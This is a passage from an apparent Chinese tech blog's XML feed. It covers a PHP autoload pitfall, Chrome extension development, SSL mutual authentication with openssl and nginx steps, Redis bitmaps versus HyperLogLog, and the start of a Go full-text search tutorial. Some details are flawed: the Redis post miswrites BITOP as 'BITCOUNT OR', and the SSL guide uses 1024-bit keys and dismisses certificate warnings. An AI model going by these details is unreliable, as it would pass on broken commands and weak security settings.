src="/articles/记一次spl-autoload-register踩坑/wiki.png" alt></p><p>明人不说暗话，这个坑出现在我项目 <a href="https://app.ya2.top/qzone/?from=article" target="_blank" rel="noopener">QQ空间自动导出</a> 里，项目不大所以没有使用三方框架，自己写了一个简单的类自动加载，替代繁琐的require过程。 项目测试运行正常，但是调试的时候发现，接口调用的同时自动模型构建代码被触发执行了，原因是class_exists触发了自动加载，导致substr截取的所有字符串都当做了类来处理，结果碰巧有一个字符串就是我的自动代码构建类，这就很有意思了。</p><p>来个简单安全Case：</p><p><img src="/articles/记一次spl-autoload-register踩坑/payload.png" alt="payload"></p><p>nice~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;定义： spl_autoload_register – 注册给定的函数作为 &lt;a href=&quot;https://www.php.net/manual/zh/function.autoload&quot; target=&quot;_blank&quot; rel=&quot;noopene
      
    
    </summary>
    
      <category term="PHP" scheme="http://ya2.top/categories/PHP/"/>
    
    
  </entry>
  
  <entry>
    <title>Chrome扩展开发</title>
    <link href="http://ya2.top/articles/Chrome%E6%89%A9%E5%B1%95%E5%BC%80%E5%8F%91/"/>
    <id>http://ya2.top/articles/Chrome扩展开发/</id>
    <published>2020-10-26T17:10:17.000Z</published>
    <updated>2021-06-16T02:21:41.763Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作者发现很多PC页面都没有做移动端转发的功能，有时候想在移动端阅读都要先在电脑上登录微信或者QQ转发到手机上面，一次两次还好，多了就觉得很不方便了，尤其是开发调试的时候。于是作者想到了开发一款浏览器插件简化一下上面的操作。</p><p>先上一下折腾出的成果 <a href="https://github.com/gouyuwang/chrome-qrcode" target="_blank" rel="noopener">Github传送门</a>:<br><img src="/articles/Chrome扩展开发/demo.png" alt> </p><h2 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h2><p>浏览器插件是一种小型的用于定制浏览器体验的程序。通过插件，我们可以定制js爬虫、屏蔽网页广告，网页实时查词，修改http请求头，等等，能做的东西很多。只要你会HTML，JavaScript，CSS就可以动手开发浏览器插件了。 </p><p>1、创建<a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json" target="_blank" rel="noopener">manifest.json</a>。任何插件都必须要有这个文件，用来描述插件的元数据，插件的配置信息。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>:<span class="string">"Qrcode"</span>,</span><br><span class="line">    <span class="attr">"description"</span>:<span class="string">"Url Qrcode Extension"</span>,</span><br><span class="line">    "version":"1.0",// 版本version在打包完插件的时候，判断插件是否需要更新</span><br><span class="line">    "manifest_version":2, </span><br><span class="line">  "description":"当前页面的二维码",</span><br><span class="line">    "browser_action":&#123;// 浏览器右上角的图标</span><br><span class="line">        "default_popup":"popup.html", // 弹出后运行的页面，相当于index.html</span><br><span class="line">        "default_icon":"icon.png",</span><br><span class="line">"default_title":"生成页面二维码"</span><br><span class="line">    &#125;,</span><br><span class="line">"icons":&#123; </span><br><span class="line">"16":"icon.png",</span><br><span class="line">"48":"icon.png",</span><br><span class="line">"128":"icon.png"</span><br><span class="line">    &#125;,</span><br><span class="line">    "commands":&#123;</span><br><span class="line">        "_execute_browser_action":&#123;</span><br><span class="line">            "suggested_key":&#123; // 快捷键</span><br><span class="line">                "default":"Ctrl+Shift+F",</span><br><span class="line">                "mac":"MacCtrl+Shift+F"</span><br><span class="line">            &#125;,</span><br><span class="line">            "description":"Opens popup.html"</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">"permissions": [ // 授权</span><br><span class="line">        "background", </span><br><span class="line">        <span class="string">"tabs"</span></span><br><span class="line">    ], </span><br><span class="line">    "background":&#123; // 后台运行</span><br><span class="line">        "script":[</span><br><span class="line">             "js/background.js" // 当前项目没有用到，因为不存在久驻后台的需求</span><br><span class="line">         ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、编写业务</p><p><img src="/articles/Chrome扩展开发/dir.png" alt="目录结构"></p><p>里面内容比较简单，生成二维码和分享均用的三方插件。值得注意的是，html里面不能和js混写，这里涉及到一个权限问题。</p><p><img src="/articles/Chrome扩展开发/jserror.png" alt="JS Error"></p><p>3、运行调试</p><ul><li>进入浏览器扩展管理</li></ul><p><img src="/articles/Chrome扩展开发/dev.png" alt></p><ul><li>开发者模式打开，然后点击 “加载已解压的扩展程序” 将创建的插件目录导入进去，如果你只有crx文件，直接右键以压缩文件方式解压就可以看到全部代码。</li></ul><p><img src="/articles/Chrome扩展开发/opendev.png" alt></p><ul><li>成功后可以看到下面的画面</li></ul><p><img src="/articles/Chrome扩展开发/success.png" alt></p><p>调试的跟普通网页调试差不多，右键点击弹出的扩展，点“审查元素”即可打开插件的开发工具，如图</p><p><img src="/articles/Chrome扩展开发/debug.png" alt></p><p>4、打包发布</p><p><img src="/articles/Chrome扩展开发/prod.png" alt> </p><p>打包后会生成.crx文件，将生成的.crx项目文件直接拖入浏览器，也可以在扩展程序里面添加，Google对这个审核还是比较严格的，禁止未上架的插件拖曳使用，但是可以以开发者模式安装。 亲测360浏览器是可以直接拖曳的使用的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>浏览器插件开发，具有很高的实用性，值得我们去学习和了解。本文是作者记录第一次学习制作插件开发的过程，内容只是作者所用到的部分，未能面面俱到，敬请谅解。 </p><p>欢迎一起讨论与留言。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions" target="_blank" rel="noopener">Browser Extensions</a></li><li><a href="http://open.chrome.360.cn/extension_dev/overview.html" target="_blank" rel="noopener">360浏览器应用开放平台</a></li></ul><style>.posts-expand .post-body img{margin:0 auto; max-height:100vh;}</style>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;作者发现很多PC页面都没有做移动端转发的功能，有时候想在移动端阅读都要先在电脑上登录微信或者QQ转发到手机上面，一次两次还好，多了就觉得很不
      
    
    </summary>
    
      <category term="前端开发" scheme="http://ya2.top/categories/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>SSL双向认证</title>
    <link href="http://ya2.top/articles/SSL%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/"/>
    <id>http://ya2.top/articles/SSL双向认证/</id>
    <published>2020-09-04T17:10:42.000Z</published>
    <updated>2021-06-16T02:22:58.659Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有朋友最近遇到客户需求：他们出于安全考虑只能是从某一台电脑才能访问应用。以下是我所想到的几种实现方案思考：</p><ul><li><p>IP地址。 你所用的IP都是运营商自动随机分配的，基本上都是处在变化中的，要想固定IP，你需要支付高昂的网络费用购买专网服务保证IP不发生变化，且需要保证局域网内就你使用这个对外的IP地址。</p></li><li><p>客户端软件。提供配套的客户端软件与web应用实现通信，配合MAC地址唯一性，验证客户身份。web端QQ自动登录就是这么发现你本地登录了哪些QQ的，更多可以看我这篇文章<a href="/articles/QQ如何实现跨端通信的/">QQ如何实现跨端通信的</a>了解原理。</p></li><li><p>SSL双向认证。生成客户证书，只让持有证书的客户访问。安装证书和安装桌面客户端是一样的考验客户的电脑操作水平。</p></li></ul><p>当然，肯定还有其他更好的方案，欢迎大佬留言指点一二。  </p><p>本篇文章主要是记录一下我是如何实现SSL双向认证这个方案的。<em>ip方案没啥好说的，保证IP唯一即可。客户端软件方案我在<a href="/articles/QQ如何实现跨端通信的/">QQ如何实现跨端通信的</a>这篇文章有DEMO。</em></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li><p>SSL单向认证</p><p><img src="/articles/SSL双向认证/SSL%E5%8D%95%E5%90%91%E8%AE%A4%E8%AF%81.png" alt="SSL单向认证"></p></li></ul><ul><li><p>①客户端的浏览器向服务器传送客户端SSL协议的版本号，加密算法的种类，产生的随机数，以及其他服务器和客户端之间通讯所需要的各种信息。</p></li><li><p>②服务器向客户端传送SSL协议的版本号，加密算法的种类，随机数以及其他相关信息，同时服务器还将向客户端传送自己的证书。</p></li><li><p>③客户利用服务器传过来的信息验证服务器的合法性，服务器的合法性包括：证书是否过期，发行服务器证书的CA是否可靠，发行者证书的公钥能否正确解开服务器证书的”发行者的数字签名”，服务器证书上的域名是否和服务器的实际域名相匹配。如果合法性验证没有通过，通讯将断开;如果合法性验证通过，将继续进行第四步。</p></li><li><p>④用户端随机产生一个用于后面通讯的”对称密码”，然后用服务器的公钥(服务器的公钥从步骤②中的服务器的证书中获得)对其加密，然后将加密后的”预主密码”传给服务器。</p></li><li><p>⑤如果服务器要求客户的身份认证(在握手过程中为可选)，用户可以建立一个随机数然后对其进行数据签名，将这个含有签名的随机数和客户自己的证书以及加密过的”预主密码”一起传给服务器。</p></li><li><p>⑥如果服务器要求客户的身份认证，服务器必须检验客户证书和签名随机数的合法性，具体的合法性验证过程包括：客户的证书使用日期是否有效，为客户提供证书的CA是否可靠，发行CA 的公钥能否正确解开客户证书的发行CA的数字签名，检查客户的证书是否在证书废止列表(CRL)中。检验如果没有通过，通讯立刻中断;如果验证通过，服务器将用自己的私钥解开加密的”预主密码 “，然后执行一系列步骤来产生主通讯密码(客户端也将通过同样的方法产生相同的主通讯密码)。</p></li><li><p>⑦服务器和客户端用相同的主密码即”通话密码”，一个对称密钥用于SSL协议的安全数据通讯的加解密通讯。同时在SSL通讯过程中还要完成数据通讯的完整性，防止数据通讯中的任何变化。</p></li><li><p>⑧客户端向服务器端发出信息，指明后面的数据通讯将使用的步骤⑦中的主密码为对称密钥，同时通知服务器客户端的握手过程结束。</p></li><li><p>⑨服务器向客户端发出信息，指明后面的数据通讯将使用的步骤⑦中的主密码为对称密钥，同时通知客户端服务器端的握手过程结束。</p></li><li><p>⑩-SSL的握手部分结束，SSL安全通道的数据通讯开始，客户和服务器开始使用相同的对称密钥进行数据通讯，同时进行通讯完整性的检验。 </p></li><li><p>SSL双向认证</p></li></ul><p><img src="/articles/SSL双向认证/SSL%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81.png" alt="SSL双向认证"></p><p>① 浏览器发送一个连接请求给安全服务器。</p><p>② 服务器将自己的证书，以及同证书相关的信息发送给客户浏览器。</p><p>③ 客户浏览器检查服务器送过来的证书是否是由自己信赖的CA中心（如沃通CA）所签发的。如果是，就继续执行协议;如果不是，客户浏览器就给客户一个警告消息：警告客户这个证书不是可以信赖的，询问客户是否需要继续。</p><p>④ 接着客户浏览器比较证书里的消息，例如域名和公钥，与服务器刚刚发送的相关消息是否一致，如果是一致的，客户浏览器认可这个服务器的合法身份。</p><p>⑤ 服务器要求客户发送客户自己的证书。收到后，服务器验证客户的证书，如果没有通过验证，拒绝连接;如果通过验证，服务器获得用户的公钥。</p><p>⑥ 客户浏览器告诉服务器自己所能够支持的通讯对称密码方案。</p><p>⑦ 服务器从客户发送过来的密码方案中，选择一种加密程度最高的密码方案，用客户的公钥加过密后通知浏览器。</p><p>⑧ 浏览器针对这个密码方案，选择一个通话密钥，接着用服务器的公钥加过密后发送给服务器。</p><p>⑨ 服务器接收到浏览器送过来的消息，用自己的私钥解密，获得通话密钥。</p><p>⑩ 服务器、浏览器接下来的通讯都是用对称密码方案，对称密钥是加过密的。</p><p>双向认证则是需要服务端与客户端提供身份认证，只能是服务端允许的客户能去访问，安全性相对于要高一些。 </p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>网上有很多实现方法，个人觉得这篇文章说的最详细：<a href="https://www.cnblogs.com/dyllove98/p/3157370.html" target="_blank" rel="noopener">传送门</a></p><p>因为我域名下面申请过一个https,所以下面是我省去生成服务器端证书直接生成客户端证书的步骤：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 生成服务器crt, 用来验证client证书的, ca.key就是https证书那个</span><br><span class="line">openssl req -new -x509 -days 3650 -key ca.key -out ca.crt </span><br><span class="line"></span><br><span class="line">// 生成客户端证书</span><br><span class="line">openssl genrsa -des3 -out client.key 1024</span><br><span class="line"></span><br><span class="line">openssl req -new -key client.key -out client.csr</span><br><span class="line"></span><br><span class="line">openssl ca -policy policy_anything -<span class="keyword">in</span> client.csr -cert ca.crt -keyfile ca.key -out client.crt -days 3650</span><br><span class="line"></span><br><span class="line">// 生成浏览器证书安装文件</span><br><span class="line">openssl pkcs12 -<span class="built_in">export</span> -inkey client.key -<span class="keyword">in</span> client.crt -out client.pfx</span><br></pre></td></tr></table></figure><p>上面代码可以在linux上面执行，也可以在windows上面执行。linux不说了，windows用户主要安装了apache的可以在它bin目录下找到 openssl.exe文件。</p><p>生成好了就开始使用了</p><ul><li>服务端</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># server</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line"></span><br><span class="line"><span class="attribute">ssl_certificate</span>  /etc/pki/ca_linvo/server/server.crt;       <span class="comment">#server公钥</span></span><br><span class="line"><span class="attribute">ssl_certificate_key</span>  /etc/pki/ca_linvo/server/server.key;   <span class="comment">#server私钥</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">ssl_client_certificate</span>   /etc/pki/ca_linvo/root/ca.crt;     <span class="comment"># 根级证书公钥，用于验证各个二级client</span></span><br><span class="line"><span class="attribute">ssl_verify_client</span> <span class="literal">on</span>;                                       <span class="comment"># 开启客户端ssl校验</span></span><br></pre></td></tr></table></figure><ul><li>客户端</li></ul><p>双击 <strong>client.pfx</strong> 安装证书，安装时会提示输入生成证书时设置的密码。安装成功后，重启浏览器输入网址访问，浏览器可能会提示你选择证书，选择刚才安装的那个证书即可。 此时有些浏览器会提示用户该证书不受信任，地址不安全之类，这是因为我们的server证书是我们自己颁发的，而非真正的权威CA机构颁布，忽略它既可。当然你也可以像我一样去 <strong>x云</strong> 申请一个免费server证书用着。 </p><ul><li>测试 </li></ul><p><img src="/articles/SSL双向认证/demo.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SSL单向验证过程中，客户端会验证自己访问的服务器端，服务器端对客户端不做验证。如果服务器端验证客户端，则需要开启服务器端验证，这就是双向验证。 </p><style>.posts-expand .post-body img{margin:0 auto; max-height:100vh;}</style>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;有朋友最近遇到客户需求：他们出于安全考虑只能是从某一台电脑才能访问应用。以下是我所想到的几种实现方案思考：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;
      
    
    </summary>
    
      <category term="服务器运维" scheme="http://ya2.top/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
    
  </entry>
  
  <entry>
    <title>Redis如何存储和计算一亿用户的活跃度</title>
    <link href="http://ya2.top/articles/Redis%E5%A6%82%E4%BD%95%E5%AD%98%E5%82%A8%E5%92%8C%E8%AE%A1%E7%AE%97%E4%B8%80%E4%BA%BF%E7%94%A8%E6%88%B7%E7%9A%84%E6%B4%BB%E8%B7%83%E5%BA%A6/"/>
    <id>http://ya2.top/articles/Redis如何存储和计算一亿用户的活跃度/</id>
    <published>2020-08-28T11:14:41.000Z</published>
    <updated>2021-06-16T02:22:02.448Z</updated>
    
    <content type="html"><![CDATA[<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>如何用<em>redis</em>存储统计1亿用户一年内的登录情况，并快速检索任意时间窗口内的活跃用户数量？</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>Redis 是一个内存数据库，采用单线程和事件驱动的机制来处理网络请求。实际生产的QPS和TPS单台都能达到 3~4 w，读写性能非常棒,用来存储一些对核心业务弱影响的用户状态信息还是非常不错的。</p><p>对于这个问题，有2个重要的点需要考虑：</p><ul><li><p><strong>如何选择合适的数据类型来存储 1 亿用户的数据？</strong><br>用普通的字符串来存储肯定不行。经查一个最简单的kv的内存占用，发现为48byte。假设每个用户每天登录需要占据1对kv的话，那一亿就是$(48*100000000)/1024/1024/1024=4.47G$，这还只是是一天的量。</p></li><li><p><strong>如何满足搜索？</strong><br>redis 是一个键值对的内存结构，只能根据 key 来进行定位 value 值，无法做到像 elasticsearch 那样对文档进行倒排索引快速全文检索。</p></li></ul><h3 id="方案一：Bitmap"><a href="#方案一：Bitmap" class="headerlink" title="方案一：Bitmap"></a>方案一：Bitmap</h3><p>在 redis 2.2.0 版本之后，新增了一个位图数据，它不是一种数据结构。实际上它就是一个字符串结构，只不过 value 是一个二进制数据，每一位只能是 0 或者 1 。redis 单独对 bitmap 提供了一套命令，可以对任意一位进行设置和读取。</p><p>bitmap 的核心命令： </p><p><strong>SETBIT</strong></p><p>语法： SETBIT key offset value</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setbit abc 5 1 ----&gt; 00001</span><br><span class="line"></span><br><span class="line">setbit abc 2 1 ----&gt; 00101</span><br></pre></td></tr></table></figure><p><strong>GETBIT</strong></p><p>语法：GETBIT key offset</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getbit abc 5 ----&gt; 1</span><br><span class="line"></span><br><span class="line">getbit abc 1 ----&gt; 0</span><br></pre></td></tr></table></figure><p>bitmap 的其他命令还有 <em>bitcount<em>，</em>bitcount<em>，</em>bitpos<em>，</em>bitop</em> 等命令，都是对位的操作。</p><p>因为 bitmap 的每一位只占据 1bit 的空间 ，所以利用这个特性我们可以把每一天作为 key，value 为 1 亿用户的活跃度状态。假设一个用户一天内只要登录了一次就算活跃。活跃我们就记为 1，不活跃我们就记为 0 。把用户 Id 作为偏移量(offset)。这样我们一个 key 就可以存储 1 亿用户的活跃状态。</p><p>我们再来算下，这样一个位图结构的值对象占据多少空间。每一个位是 1bit，一亿用户就是一亿 bit 。8bit=1Byte</p><p>$100000000/8/1024/1024=11.92M$</p><p>我用测试工程往一个 key 里通过 lua 塞进了 1 亿个 bit，然后用 rdb tools 统计这个可以需要消耗 12M 的内存空间，这完全符合要求，而且 redis 可以集群部署来进行扩容存储。我们也可以用位图压缩算法对 bitmap 进行压缩存储，例如： WAH，EWAH，Roaring Bitmaps。</p><p>我们把每一天 1 亿用户的登录状态都用 bitmap 的形式存进了 redis，那要获取某一天 id 为 88000 的用户是否活跃，直接使用命令：</p><blockquote><p>GETBIT 2020-01-01 88000 [时间复杂度为 O(1)]</p></blockquote><p>如果要统计某一天的所有的活跃用户数，使用bitcount命令，bitcount 可以统计 1 的个数，也就是活跃用户数：</p><blockquote><p>BITCOUNT 2020-01-01 [时间复杂度为 O(N)]</p></blockquote><p>如果要统计某一段时间内的活跃用户数，需要用到 bitop 命令。这个命令提供四种位运算，AND(与)，(OR)或，XOR(亦或)，NOT(非)。我们可以对某一段时间内的所有 key 进行OR(或)操作，或操作出来的位图是 0 的就代表这段时间内一次都没有登录的用户。那只要我们求出 1 的个数就可以了。以下例子求出了 2020-01-01 到 2020-01-05 这段时间内的活跃用户数:</p><blockquote><p>BITCOUNT OR result 2020-01-01 2020-01-02 2020-01-03 2020-01-04 2020-01-05 [时间复杂度为 O(N)]</p></blockquote><p>从时间复杂度上说，无论是统计某一天，还是统计一段时间, 在实际测试中基本上都是秒出的，符合我们的预期。</p><p>bitmap 可以很好的满足一些需要记录大量而简单信息的场景，所占空间十分小，通常来说使用场景分 2 类：</p><ul><li><p>某一业务对象的横向扩展，key 为某一个业务对象的 id，比如记录某一个终端的功能开关，1 代表开，0 代表关。基本可以无限扩展，可以记录 2^32 个位信息。不过这种用法由于 key 上带有了业务对象的 id，导致了 key 的存储空间大于了 value 的存储空间，从空间使用角度上来看有一定的优化空间。</p></li><li><p>某一业务的纵向扩展，key 为某一个业务，把每一个业务对象的 id 作为偏移量记录到位上。这道面试题的例子就是用此法来进行解决。十分巧妙的利用了用户的 id 作为偏移量来找到相对应的值。当业务对象数量超过 2^32 时（约等于 42 亿），还可以分片存储。</p></li></ul><h3 id="方案二：HyperLogLog"><a href="#方案二：HyperLogLog" class="headerlink" title="方案二：HyperLogLog"></a>方案二：HyperLogLog</h3><p>redis 从 2.8.9 之后增加了 HyperLogLog 数据结构。这个数据结构，根据 redis 的官网介绍，这是一个概率数据结构，用来估算数据的基数。能通过牺牲准确率来减少内存空间的消耗。</p><p>我们先来看看 HyperLogLog 的方法：</p><p><strong>PFADD</strong> 添加一个元素，如果重复，只算作一个</p><p><strong>PFCOUNT</strong> 返回元素数量的近似值</p><p><strong>PFMERGE</strong> 将多个 HyperLogLog 合并为一个 HyperLogLog</p><p>这很好理解，是不是。那我们就来看看同样是存储一亿用户的活跃度，HyperLogLog 数据结构需要多少空间。是不是比 bitmap 更加省空间呢。</p><p>我通过测试工程往 HyperLogLog 里 PFADD 了一亿个元素，通过 rdb tools 工具统计了这个 key 只需要 14392 Bytes，也就是 14KB 的空间。bitmap 存储一亿需要 12M，而 HyperLogLog 只需要 14K 的空间。这是一个很惊人的结果。<br>接下来我又放了 1000w 数据，统计出来还是 14k 。也就是说，无论你放多少数据进去，都是 14K 。</p><p>查了文档，发现 HyperLogLog 是一种概率性数据结构，在标准误差 0.81%的前提下，能够统计 ${2}^{64}$ 个数据。所以 HyperLogLog 适合在比如统计日活月活此类的对精度要不不高的场景。</p><p>HyperLogLog 使用概率算法来统计集合的近似基数，而它算法的最本源则是<em>伯努利过程</em>。</p><blockquote><p><a href="https://baike.baidu.com/item/%E4%BC%AF%E5%8A%AA%E5%88%A9%E8%BF%87%E7%A8%8B/610420?fr=aladdin" target="_blank" rel="noopener">伯努利过程</a>：简单来说，伯努利过程就是一个抛硬币实验的过程。抛一枚正常硬币，落地可能是正面，也可能是反面，二者的概率都是 $\frac{1}{2}$ 。伯努利过程就是一直抛硬币，直到落地时出现正面位置，并记录下抛掷次数 k 。比如说，抛一次硬币就出现正面了，此时 k 为 1; 第一次抛硬币是反面，则继续抛，直到第三次才出现正面，此时 k 为 3 。 对于 n 次伯努利过程，我们会得到 n 个出现正面的投掷次数值 $k_1$, $k_2$ … $k_n$ , 其中这里的最大值是 $k_{max}$ 。根据一顿数学推导，我们可以得出一个结论：${2}^{k_{max}}$来作为 n 的估计值。也就是说你可以根据最大投掷次数近似的推算出进行了几次伯努利过程。</p></blockquote><p>虽然 HyperLogLog 数据类型不是精确统计,只适用于对精度要求不高的场景，而且这种类型无法得出每个用户的活跃度信息。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于文章开头所提到的问题，用 <strong>Bitmap</strong> 和 <strong>HyperLogLog</strong> 都可以解决。</p><table><thead><tr><th align="left"></th><th align="left">Bitmap</th><th align="left">HyperLogLog</th></tr></thead><tbody><tr><td align="left">优点</td><td align="left">非常均衡的特性，精准统计，可以得到每个统计对象的状态，秒出</td><td align="left">可以统计夸张到无法想象的数量，并且占用小的夸张的内存</td></tr><tr><td align="left">缺点</td><td align="left">当你的统计对象数量十分十分巨大时，可能会占用到一点存储空间，但也可在接受范围内。也可以通过分片，或者压缩的额外手段去解决</td><td align="left">建立在牺牲准确率的基础上，而且无法得到每个统计对象的状态</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h3&gt;&lt;p&gt;如何用&lt;em&gt;redis&lt;/em&gt;存储统计1亿用户一年内的登录情况，并快速检索任意时间窗口内的活跃用户数量？&lt;/p&gt;
&lt;h3 id=&quot;分析&quot;
      
    
    </summary>
    
      <category term="数据库" scheme="http://ya2.top/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
  </entry>
  
  <entry>
    <title>实现一个简单的全文检索引擎</title>
    <link href="http://ya2.top/articles/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2%E5%BC%95%E6%93%8E/"/>
    <id>http://ya2.top/articles/实现一个简单的全文检索引擎/</id>
    <published>2020-08-18T11:02:43.000Z</published>
    <updated>2021-06-16T02:21:42.966Z</updated>
    
    <content type="html"><![CDATA[<p>全文检索是人们每天都在使用的工具之一。如果你曾经在google上搜索过“golang使用情况”或试图在电子商务网站上找到“室内无线摄像头”，你都会使用某种全文检索。</p><p>全文检索（FTS）是一种在文档集合中搜索文本的技术。文档可以引用网页、报纸文章、电子邮件或其他任何结构文本。</p><p>今天我们要建造我们自己的FTS引擎。在这篇文章的最后，我们将能够在不到一毫秒的时间内搜索数百万个文档。我们将从简单的搜索查询开始，比如“给我包含单词cat的所有文档”，然后扩展引擎以支持更复杂的布尔查询。</p><blockquote><p>注：最著名的FTS引擎是<a href="https://lucene.apache.org/" target="_blank" rel="noopener">Lucene</a>（以及在此基础上构建的 <a href="https://www.elastic.co/cn/" target="_blank" rel="noopener">Elasticsearch</a> 和 <a href="https://lucene.apache.org/solr/" target="_blank" rel="noopener">Solr</a> ）。</p></blockquote><h3 id="为什么选择FTS"><a href="#为什么选择FTS" class="headerlink" title="为什么选择FTS"></a>为什么选择FTS</h3><p>在我们开始编写代码之前，您可能会问：“我们不能只使用grep，或者使用一个循环来检查每个文档是否包含我要查找的单词？” 是的，我们可以，但这并不是最好的方式。</p><h3 id="语料库"><a href="#语料库" class="headerlink" title="语料库"></a>语料库</h3><p>点击下载 <a href="https://dumps.wikimedia.org/enwiki/latest/enwiki-latest-abstract1.xml.gz" target="_blank" rel="noopener">dumps.wikimedia.org</a> 语料。</p><p>语料的格式如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Wikipedia: Kit-Cat Klock<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url</span>&gt;</span>https://en.wikipedia.org/wiki/Kit-Cat_Klock<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abstract</span>&gt;</span>The Kit-Cat Klock is an art deco novelty wall clock shaped like a grinning cat with cartoon eyes that swivel in time with its pendulum tail.<span class="tag">&lt;/<span class="name">abstract</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="加载文档"><a href="#加载文档" class="headerlink" title="加载文档"></a>加载文档</h3><p>首先，我们需要加载上一步下载的文档。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"encoding/xml"</span></span><br><span class="line">    <span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span 